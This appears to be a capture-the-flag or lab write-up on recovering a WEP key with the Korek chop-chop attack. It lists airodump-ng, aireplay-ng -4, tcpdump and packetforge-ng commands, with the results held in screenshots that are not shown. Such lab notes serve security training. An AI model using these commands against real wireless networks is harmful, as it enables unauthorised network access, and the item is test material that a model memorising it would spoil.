# [Korek Chop Chop Attack](Korek%20Chop%20Chop%20Attack.md)
### Perform the Korek Chop Chop attack on the WiFi network. What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)

```sh
airodump-ng wlan0mon -c 1 -w WEP
```

![](Screenshot%202026-09-21%20at%2015.51.13.png)

```sh
aireplay-ng -4 -b <BSSID>  -h <MAC ADDRESS>  wlan0mon
```

![](Screenshot%202026-09-21%20at%2015.52.50.png)

```sh
tcpdump -s 0 -n -e -r <REPLAY_DEC>

packetforge-ng -0 -a <access point> -h <the station> -k <access point IP> -l <station IP>
```

![](Screenshot%202026-09-21%20at%2015.58.14.png)

![](Screenshot%202026-09-21%20at%2016.02.42.png)

![](Screenshot%202026-09-21%20at%2016.02.56.png)

![](Screenshot%202026-09-21%20at%2016.03.48.png)